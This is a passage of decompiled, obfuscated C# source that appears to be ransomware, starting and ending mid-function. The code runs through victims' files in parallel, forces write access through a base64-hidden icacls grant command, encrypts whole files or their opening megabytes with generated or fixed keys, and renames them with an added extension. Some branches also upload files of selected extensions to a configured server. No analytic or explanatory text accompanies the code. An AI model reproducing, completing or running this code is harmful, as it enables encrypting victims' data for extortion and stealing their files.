				{
					uWeqxhASudz.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (mWVhKlhRjNKlia == "YES" && fileStream.Length > Convert.ToInt32(QwggfFbICMPoft) * 1024 * 1024 && !list3.Contains(text))
					{
						if (VjQPfxZAMTjUgJ == "YES")
						{
							foreach (string item2 in GkngOkBVtwXA)
							{
								if (item.ToLower().EndsWith(item2) && kcuNJebGcjkOW == "YES")
								{
									if (Convert.ToInt32(HbtHzSSIxwCpn) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && kcuNJebGcjkOW == "NO")
								{
									try
									{
										dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = IuIIhDBsGDXt.dbNTPTvtWbWOCoG(item, Convert.ToInt32(QwggfFbICMPoft) * 1024 * 1024);
						byte[] giNofYHUtqNeDrVh = IuIIhDBsGDXt.hzCfVwhNVmpN(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						IuIIhDBsGDXt.dfpNpoHXtKEP(item, giNofYHUtqNeDrVh);
						if (string_2 != ".*")
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != ".*")
					{
						PcyGFmEQsjGdEVbC(item, item + string_2, WLkpdSTfqi);
					}
					else
					{
						PcyGFmEQsjGdEVbC(item, item + ".part", WLkpdSTfqi);
					}
				}
				catch (Exception)
				{
				}
				IL_02f3:;
			}
		}
	}

	public static void ErxvXJZOXLaGvTFEwn(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		NqgLGuiWzfCY.hLwPTCoaDXFTRD CS_0024_003C_003E8__locals0 = new NqgLGuiWzfCY();
		CS_0024_003C_003E8__locals0.bJYKLBcpDU = list_0;
		CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL = string_1;
		CS_0024_003C_003E8__locals0.ubOMKyMUqzMPH = string_2;
		CS_0024_003C_003E8__locals0.zVjVWQkqZc = string_3;
		CS_0024_003C_003E8__locals0.TbgrPwEdpnztCF = new List<string> { "" };
		if (VdUyrckhXSQ == "NO")
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				using List<string>.Enumerator enumerator2 = CS_0024_003C_003E8__locals0.bJYKLBcpDU.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					NqgLGuiWzfCY.pCEAcJSlihfT CS_0024_003C_003E8__locals1 = new NqgLGuiWzfCY.pCEAcJSlihfT();
					CS_0024_003C_003E8__locals1.skojTCfpMTmBgaE = CS_0024_003C_003E8__locals0;
					CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK = enumerator2.Current;
					if (CS_0024_003C_003E8__locals0.ubOMKyMUqzMPH.Length != 0)
					{
						string[] ubOMKyMUqzMPH2 = CS_0024_003C_003E8__locals0.ubOMKyMUqzMPH;
						int num2 = 0;
						while (num2 < ubOMKyMUqzMPH2.Length)
						{
							string value2 = ubOMKyMUqzMPH2[num2];
							if (!CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_09f3;
						}
					}
					try
					{
						if (CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK.EndsWith(CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL))
						{
							goto IL_09f3;
						}
					}
					catch (Exception)
					{
						goto IL_09f3;
					}
					if (CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK.EndsWith(string_0) && !RQEvWqwCwPPGRO.Contains(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK))
					{
						if (mGDrzdnKDnvM == "YES")
						{
							try
							{
								if (jKkQUJosFPVdk.waTjtdDWNGqfzuC(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK))
								{
									jKkQUJosFPVdk.TMsATZeUtEjbUs(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
								}
							}
							catch
							{
							}
						}
						RQEvWqwCwPPGRO.Add(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
						Thread thread3 = new Thread((ThreadStart)delegate
						{
							try
							{
								if (WXNHDtRjOR)
								{
									Console.WriteLine("File in process: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK).Length + " bytes");
									Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", RQEvWqwCwPPGRO.Count, RGcMmldgjxiBCQ, kAIRALERmvGYRk);
									Console.WriteLine("Time elapsed:  {0}", WnKvTcsQHPkFh.Elapsed);
									Console.WriteLine("----------------------------------------------------------------------------");
								}
							}
							catch
							{
							}
						});
						thread3.Priority = ThreadPriority.Normal;
						thread3.IsBackground = true;
						thread3.Start();
						if (!uWeqxhASudz.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK)))
						{
							uWeqxhASudz.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK));
						}
						nPNwbmqRpAob(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
						try
						{
							new mbyhMxOviAa().HeFNHeFPXu(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (WXNHDtRjOR)
									{
										Console.WriteLine("Setting write access permission: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK).Length + " bytes");
										Console.WriteLine("----------------------------------------------------------------------------");
									}
								}
								catch
								{
								}
								BYWGmjrQxPOi(aOUUGKAtMbj("aWNhY2xzLmV4ZQ=="), "\"" + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + "\"" + aOUUGKAtMbj("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + aOUUGKAtMbj("OkYgL1QgL0MgL1E="));
							}
						}
						catch (Exception ex18)
						{
							if (NZZJwvuCaIyu)
							{
								try
								{
									File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - Error while checking for user write access permission: " + ex18.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK).Length != 0L)
								{
									goto end_IL_02e2;
								}
								goto end_IL_02e2_2;
								end_IL_02e2:;
							}
							catch (Exception ex20)
							{
								if (NZZJwvuCaIyu)
								{
									try
									{
										File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - Error while reading if filesize is zero: " + ex20.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								kAIRALERmvGYRk++;
								goto end_IL_02e2_2;
							}
							if (!(mWVhKlhRjNKlia == "YES") || new FileInfo(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK).Length <= Convert.ToInt32(QwggfFbICMPoft) * 1024 * 1024 || CS_0024_003C_003E8__locals0.TbgrPwEdpnztCF.Contains(string_0))
							{
								if (BSFTTffCPqVFY)
								{
									CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL = XOTrqnPLqah + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL;
								}
								string text3 = AuDAdFkipC.mPripbmHPhq(32);
								string s3 = LBIBcyVRyJsgY.EMWORkdaaqST(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL != ".*")
								{
									if (!xetcGCQIRoI)
									{
										if (!cqwcNhPdCH)
										{
											UzRQaROZaVQyO(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, WLkpdSTfqi);
										}
										else
										{
											UzRQaROZaVQyO(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!cqwcNhPdCH)
											{
												UjAXoJppaj(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, WLkpdSTfqi);
											}
											else
											{
												UjAXoJppaj(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex22)
										{
											if (NZZJwvuCaIyu)
											{
												try
												{
													File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - Error while fully writing to file: " + ex22.Message + "\r\n");
												}
												catch (Exception)
												{
												}
											}
											kAIRALERmvGYRk++;
											try
											{
												File.Move(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
											}
											catch (Exception)
											{
											}
											goto end_IL_02e2_2;
										}
									}
								}
								else if (!xetcGCQIRoI)
								{
									if (!cqwcNhPdCH)
									{
										UzRQaROZaVQyO(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + ".part", WLkpdSTfqi);
									}
									else
									{
										UzRQaROZaVQyO(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + ".part", Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!cqwcNhPdCH)
										{
											UjAXoJppaj(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, WLkpdSTfqi);
										}
										else
										{
											UjAXoJppaj(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex25)
									{
										if (NZZJwvuCaIyu)
										{
											try
											{
												File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - Error while fully writing to file: " + ex25.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
										kAIRALERmvGYRk++;
										goto end_IL_02e2_2;
									}
								}
								if (cqwcNhPdCH)
								{
									if (CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL != ".*")
									{
										MBaDCxnytAAU(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, bytes3);
									}
									else
									{
										MBaDCxnytAAU(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, bytes3);
									}
								}
								goto IL_09f3;
							}
							CS_0024_003C_003E8__locals0 = new NqgLGuiWzfCY.xsjOoqCFQXplGn();
							CS_0024_003C_003E8__locals0.DdBxMAQkUzlA = CS_0024_003C_003E8__locals1;
							CS_0024_003C_003E8__locals0.skojTCfpMTmBgaE = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL != ".*")
								{
									if (BSFTTffCPqVFY)
									{
										CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL = XOTrqnPLqah + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL;
									}
									File.Move(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL);
								}
							}
							catch (Exception ex27)
							{
								if (NZZJwvuCaIyu)
								{
									try
									{
										File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - Error while renaming to crypted extension: " + ex27.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								kAIRALERmvGYRk++;
								goto end_IL_02e2_2;
							}
							CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw = "";
							if (CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL != ".*")
							{
								CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw = CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL;
							}
							else
							{
								CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw = CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK;
							}
							if (VjQPfxZAMTjUgJ == "YES")
							{
								Thread thread4 = new Thread((ThreadStart)delegate
								{
									foreach (string item in GkngOkBVtwXA)
									{
										if (CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.skojTCfpMTmBgaE.iLLbyCvEDeENhQL) && kcuNJebGcjkOW == "YES")
										{
											if (Convert.ToInt32(HbtHzSSIxwCpn) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw).Length)
											{
												try
												{
													dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw.ToLower().EndsWith(item) && kcuNJebGcjkOW == "NO")
										{
											try
											{
												dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw);
											}
											catch
											{
											}
										}
									}
								});
								thread4.Priority = ThreadPriority.Normal;
								thread4.IsBackground = false;
								thread4.Start();
							}
							string text4 = AuDAdFkipC.mPripbmHPhq(32);
							string s4 = LBIBcyVRyJsgY.EMWORkdaaqST(text4);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							if (vcFnlphaWZwF == "NO")
							{
								byte[] array2 = null;
								byte[] byte_2 = IuIIhDBsGDXt.dbNTPTvtWbWOCoG(CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw, Convert.ToInt32(QwggfFbICMPoft) * 1024 * 1024);
								if (IuIIhDBsGDXt.dfpNpoHXtKEP(giNofYHUtqNeDrVh: (!GtQHtyUYTAIYOR) ? (cqwcNhPdCH ? IuIIhDBsGDXt.hzCfVwhNVmpN(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : IuIIhDBsGDXt.hzCfVwhNVmpN(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.zVjVWQkqZc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (cqwcNhPdCH ? KBdxgLGHgkeiH.XWZoHXBxnyxpF(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : KBdxgLGHgkeiH.XWZoHXBxnyxpF(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.zVjVWQkqZc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), DOYGxpRQSwJj: CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw, DdudrgeqXqE: bytes4))
								{
									goto IL_09f3;
								}
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
								}
								catch (Exception)
								{
								}
							}
							else if (!cqwcNhPdCH)
							{
								if (aPmKQJajtniGBkiL.giukCbhWyeyjClL(CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw, QwggfFbICMPoft, CS_0024_003C_003E8__locals0.zVjVWQkqZc))
								{
									goto IL_09f3;
								}
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (aPmKQJajtniGBkiL.giukCbhWyeyjClL(CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw, QwggfFbICMPoft, text4, bytes4))
								{
									goto IL_09f3;
								}
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
								}
								catch (Exception)
								{
								}
							}
							end_IL_02e2_2:;
						}
						catch (Exception)
						{
							goto IL_09f3;
						}
					}
					continue;
					IL_09f3:
					CS_0024_003C_003E8__locals0.bJYKLBcpDU.Remove(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.bJYKLBcpDU, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new NqgLGuiWzfCY.hLwPTCoaDXFTRD();
			CS_0024_003C_003E8__locals0.skojTCfpMTmBgaE = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK = string_0;
			if (CS_0024_003C_003E8__locals0.ubOMKyMUqzMPH.Length != 0)
			{
				string[] ubOMKyMUqzMPH = CS_0024_003C_003E8__locals0.ubOMKyMUqzMPH;
				int num = 0;
				while (num < ubOMKyMUqzMPH.Length)
				{
					string value = ubOMKyMUqzMPH[num];
					if (!CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0978;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK.EndsWith(CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL))
				{
					goto IL_0978;
				}
			}
			catch (Exception)
			{
				goto IL_0978;
			}
			if (!RQEvWqwCwPPGRO.Contains(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK))
			{
				if (mGDrzdnKDnvM == "YES")
				{
					try
					{
						if (jKkQUJosFPVdk.waTjtdDWNGqfzuC(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK))
						{
							jKkQUJosFPVdk.TMsATZeUtEjbUs(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
						}
					}
					catch
					{
					}
				}
				RQEvWqwCwPPGRO.Add(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (WXNHDtRjOR)
						{
							Console.WriteLine("File in process: " + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK).Length + " bytes");
							Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", RQEvWqwCwPPGRO.Count, RGcMmldgjxiBCQ, kAIRALERmvGYRk);
							Console.WriteLine("Time elapsed:  {0}", WnKvTcsQHPkFh.Elapsed);
							Console.WriteLine("----------------------------------------------------------------------------");
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!uWeqxhASudz.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK)))
				{
					uWeqxhASudz.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK));
				}
				nPNwbmqRpAob(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
				try
				{
					new mbyhMxOviAa().HeFNHeFPXu(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (WXNHDtRjOR)
							{
								Console.WriteLine("Setting write access permission: " + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
						BYWGmjrQxPOi(aOUUGKAtMbj("aWNhY2xzLmV4ZQ=="), "\"" + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + "\"" + aOUUGKAtMbj("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + aOUUGKAtMbj("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (NZZJwvuCaIyu)
					{
						try
						{
							File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK).Length != 0L)
						{
							goto end_IL_02af;
						}
						goto end_IL_02af_2;
						end_IL_02af:;
					}
					catch (Exception ex4)
					{
						if (NZZJwvuCaIyu)
						{
							try
							{
								File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						kAIRALERmvGYRk++;
						goto end_IL_02af_2;
					}
					if (mWVhKlhRjNKlia == "YES" && new FileInfo(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK).Length > Convert.ToInt32(QwggfFbICMPoft) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL != ".*")
							{
								if (BSFTTffCPqVFY)
								{
									CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL = XOTrqnPLqah + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL;
								}
								File.Move(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL);
							}
						}
						catch (Exception ex6)
						{
							if (NZZJwvuCaIyu)
							{
								try
								{
									File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							kAIRALERmvGYRk++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL != ".*")
						{
							CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK += CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL;
						}
						if (VjQPfxZAMTjUgJ == "YES")
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in GkngOkBVtwXA)
								{
									if (CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.skojTCfpMTmBgaE.iLLbyCvEDeENhQL) && kcuNJebGcjkOW == "YES")
									{
										if (Convert.ToInt32(HbtHzSSIxwCpn) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK).Length)
										{
											try
											{
												dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK.ToLower().EndsWith(item2) && kcuNJebGcjkOW == "NO")
									{
										try
										{
											dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
										}
										catch
										{
										}
									}
								}
							});
							thread2.IsBackground = false;
							thread2.Priority = ThreadPriority.Normal;
							thread2.Start();
						}
						string text = AuDAdFkipC.mPripbmHPhq(32);
						string s = LBIBcyVRyJsgY.EMWORkdaaqST(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (vcFnlphaWZwF == "NO")
						{
							byte[] array = null;
							byte[] byte_ = IuIIhDBsGDXt.dbNTPTvtWbWOCoG(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, Convert.ToInt32(QwggfFbICMPoft) * 1024 * 1024);
							if (!IuIIhDBsGDXt.dfpNpoHXtKEP(giNofYHUtqNeDrVh: (!GtQHtyUYTAIYOR) ? (cqwcNhPdCH ? IuIIhDBsGDXt.hzCfVwhNVmpN(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : IuIIhDBsGDXt.hzCfVwhNVmpN(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.zVjVWQkqZc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (cqwcNhPdCH ? KBdxgLGHgkeiH.XWZoHXBxnyxpF(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : KBdxgLGHgkeiH.XWZoHXBxnyxpF(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.zVjVWQkqZc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), DOYGxpRQSwJj: CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, DdudrgeqXqE: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!cqwcNhPdCH)
						{
							if (!aPmKQJajtniGBkiL.giukCbhWyeyjClL(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, QwggfFbICMPoft, CS_0024_003C_003E8__locals0.zVjVWQkqZc))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!aPmKQJajtniGBkiL.giukCbhWyeyjClL(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, QwggfFbICMPoft, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (BSFTTffCPqVFY)
						{
							CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL = XOTrqnPLqah + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL;
						}
						string text2 = AuDAdFkipC.mPripbmHPhq(32);
						string s2 = LBIBcyVRyJsgY.EMWORkdaaqST(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL != ".*")
						{
							if (!xetcGCQIRoI)
							{
								if (!cqwcNhPdCH)
								{
									UzRQaROZaVQyO(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, WLkpdSTfqi);
								}
								else
								{
									UzRQaROZaVQyO(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!cqwcNhPdCH)
									{
										UjAXoJppaj(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, WLkpdSTfqi);
									}
									else
									{
										UjAXoJppaj(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (NZZJwvuCaIyu)
									{
										try
										{
											File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + " - Error while fully writing to file: " + ex11.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									kAIRALERmvGYRk++;
									try
									{
